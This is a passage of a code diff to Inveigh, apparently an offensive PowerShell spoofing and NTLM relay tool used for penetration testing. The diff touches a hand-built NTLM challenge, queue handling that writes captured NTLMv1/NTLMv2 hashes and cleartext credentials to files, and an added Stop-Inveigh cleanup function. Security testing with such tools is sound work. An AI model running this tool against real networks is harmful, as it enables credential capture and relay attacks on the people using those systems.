+                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
+                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
+                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
+                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
+                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
+                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
+                            $HTTP_timestamp +
+                            0x00,0x00,0x00,0x00,0x0a,0x0a
 
         $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
         $NTLM = 'NTLM ' + $NTLM_challenge_base64
@@ -1484,25 +1529,25 @@ $control_relay_scriptblock =
             while($inveigh.log_file_queue.Count -gt 0)
             {
                 $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
-                $inveigh.log_file_queue.RemoveRange(0,1)
+                $inveigh.log_file_queue.RemoveAt(0)
             }
 
             while($inveigh.NTLMv1_file_queue.Count -gt 0)
             {
                 $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
-                $inveigh.NTLMv1_file_queue.RemoveRange(0,1)
+                $inveigh.NTLMv1_file_queue.RemoveAt(0)
             }
 
             while($inveigh.NTLMv2_file_queue.Count -gt 0)
             {
                 $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
-                $inveigh.NTLMv2_file_queue.RemoveRange(0,1)
+                $inveigh.NTLMv2_file_queue.RemoveAt(0)
             }
 
             while($inveigh.cleartext_file_queue.Count -gt 0)
             {
                 $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
-                $inveigh.cleartext_file_queue.RemoveRange(0,1)
+                $inveigh.cleartext_file_queue.RemoveAt(0)
             }
         
         }
@@ -1582,19 +1627,13 @@ if($inveigh.console_output)
             if($inveigh.output_stream_only)
             {
                 Write-Output($inveigh.console_queue[0] + $inveigh.newline)
-                $inveigh.console_queue.RemoveRange(0,1)
+                $inveigh.console_queue.RemoveAt(0)
             }
             else
             {
 
                 switch -wildcard ($inveigh.console_queue[0])
                 {
-
-                    "Inveigh *exited *"
-                    {
-                        Write-Warning $inveigh.console_queue[0]
-                        $inveigh.console_queue.RemoveRange(0,1)
-                    }
 
                     "* written to *"
                     {
@@ -1604,31 +1643,31 @@ if($inveigh.console_output)
                             Write-Warning $inveigh.console_queue[0]
                         }
 
-                        $inveigh.console_queue.RemoveRange(0,1)
+                        $inveigh.console_queue.RemoveAt(0)
                     }
 
                     "* for relay *"
                     {
                         Write-Warning $inveigh.console_queue[0]
-                        $inveigh.console_queue.RemoveRange(0,1)
+                        $inveigh.console_queue.RemoveAt(0)
                     }
 
                     "*SMB relay *"
                     {
                         Write-Warning $inveigh.console_queue[0]
-                        $inveigh.console_queue.RemoveRange(0,1)
+                        $inveigh.console_queue.RemoveAt(0)
                     }
 
                     "* local administrator *"
                     {
                         Write-Warning $inveigh.console_queue[0]
-                        $inveigh.console_queue.RemoveRange(0,1)
+                        $inveigh.console_queue.RemoveAt(0)
                     }
 
                     default
                     {
                         Write-Output $inveigh.console_queue[0]
-                        $inveigh.console_queue.RemoveRange(0,1)
+                        $inveigh.console_queue.RemoveAt(0)
                     }
 
                 }
@@ -1760,6 +1799,105 @@ function Stop-Inveigh
 
 } 
 
+function Stop-Inveigh
+{
+    <#
+    .SYNOPSIS
+    Stop-Inveigh will stop all running Inveigh functions.
+    #>
+
+    if($inveigh)
+    {
+        if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
+        {
+
+            if($inveigh.HTTP_listener.IsListening)
+            {
+                $inveigh.HTTP_listener.Stop()
+                $inveigh.HTTP_listener.Close()
+            }
+            
+            if($inveigh.unprivileged_running)
+            {
+                $inveigh.unprivileged_running = $false
+                Start-Sleep -s 5
+                Write-Output("Inveigh Unprivileged exited at $(Get-Date -format 's')")
+                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited")  > $null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - Inveigh Unprivileged exited" | Out-File $Inveigh.log_out_file -Append
+                }
+
+            }
+            
+            if($inveigh.relay_running)
+            {
+                $inveigh.relay_running = $false
+                Write-Output("Inveigh Relay exited at $(Get-Date -format 's')")
+                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited")  > $null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - Inveigh Relay exited" | Out-File $Inveigh.log_out_file -Append
+                }
+
+            } 
+
+            if($inveigh.running)
+            {
+                $inveigh.running = $false
+                Write-Output("Inveigh exited at $(Get-Date -format 's')")
+                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited")  > $null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - Inveigh exited" | Out-File $Inveigh.log_out_file -Append
+                }
+
+            } 
+
+        }
+        else
+        {
+            Write-Output("There are no running Inveigh functions")
+        }
+    
+        if($inveigh.HTTPS)
+        {
+            & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null
+
+            try
+            {
+                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
+                $certificate_store.Open('ReadWrite')
+                $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
+                $certificate_store.Remove($certificate)
+                $certificate_store.Close()
+            }
+            catch
+            {
+                Write-Output("SSL Certificate Deletion Error - Remove Manually")
+                $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
+                }
+
+            }
+        }
+
+        $inveigh.HTTP = $false
+        $inveigh.HTTPS = $false
+    }
+    else
+    {
+        Write-Output("There are no running Inveigh functions")|Out-Null
+    }
+
+} 
+
 function Get-Inveigh
 {
     <#
@@ -1773,19 +1911,13 @@ function Get-Inveigh
         if($inveigh.output_stream_only)
         {
             Write-Output($inveigh.console_queue[0] + $inveigh.newline)
-            $inveigh.console_queue.RemoveRange(0,1)
+            $inveigh.console_queue.RemoveAt(0)
         }
         else
         {
 
             switch -wildcard ($inveigh.console_queue[0])
             {
-
-                "Inveigh *exited *"
-                {
-                    Write-Warning $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveRange(0,1)
-                }
 
                 "* written to *"
                 {
@@ -1795,31 +1927,31 @@ function Get-Inveigh
                         Write-Warning $inveigh.console_queue[0]
                     }
 
-                    $inveigh.console_queue.RemoveRange(0,1)
+                    $inveigh.console_queue.RemoveAt(0)
                 }
 
                 "* for relay *"
                 {
                     Write-Warning $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveRange(0,1)
+                    $inveigh.console_queue.RemoveAt(0)
                 }
 
                 "*SMB relay *"
                 {
                     Write-Warning $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveRange(0,1)
+                    $inveigh.console_queue.RemoveAt(0)
                 }
 
                 "* local administrator *"
                 {
                     Write-Warning $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveRange(0,1)
+                    $inveigh.console_queue.RemoveAt(0)
                 }
 
                 default
                 {
                     Write-Output $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveRange(0,1)
+                    $inveigh.console_queue.RemoveAt(0)
                 }
 
             }
@@ -2005,7 +2137,7 @@ function Watch-Inveigh
                     if($inveigh.output_stream_only)
                     {
                         Write-Output($inveigh.console_queue[0] + $inveigh.newline)
-                        $inveigh.console_queue.RemoveRange(0,1)
+                        $inveigh.console_queue.RemoveAt(0)
                     }
                     else
                     {
@@ -2016,7 +2148,7 @@ function Watch-Inveigh
                             "Inveigh *exited *"
                             {
                                 Write-Warning $inveigh.console_queue[0]
-                                $inveigh.console_queue.RemoveRange(0,1)
+                                $inveigh.console_queue.RemoveAt(0)
                             }
 
                             "* written to *"
@@ -2027,31 +2159,31 @@ function Watch-Inveigh
                                     Write-Warning $inveigh.console_queue[0]
                                 }
 
-                                $inveigh.console_queue.RemoveRange(0,1)
+                                $inveigh.console_queue.RemoveAt(0)
                             }
 
                             "* for relay *"
                             {
                                 Write-Warning $inveigh.console_queue[0]
-                                $inveigh.console_queue.RemoveRange(0,1)
+                                $inveigh.console_queue.RemoveAt(0)
                             }
 
                             "*SMB relay *"
                             {
                                 Write-Warning $inveigh.console_queue[0]
-                                $inveigh.console_queue.RemoveRange(0,1)
+                                $inveigh.console_queue.RemoveAt(0)
                             }
 
                             "* local administrator *"
                             {
                                 Write-Warning $inveigh.console_queue[0]
-                                $inveigh.console_queue.RemoveRange(0,1)
+                                $inveigh.console_queue.RemoveAt(0)
                             }
 
                             default
                             {
                                 Write-Output $inveigh.console_queue[0]
-                                $inveigh.console_queue.RemoveRange(0,1)
+                                $inveigh.console_queue.RemoveAt(0)
                             }
 
                         }
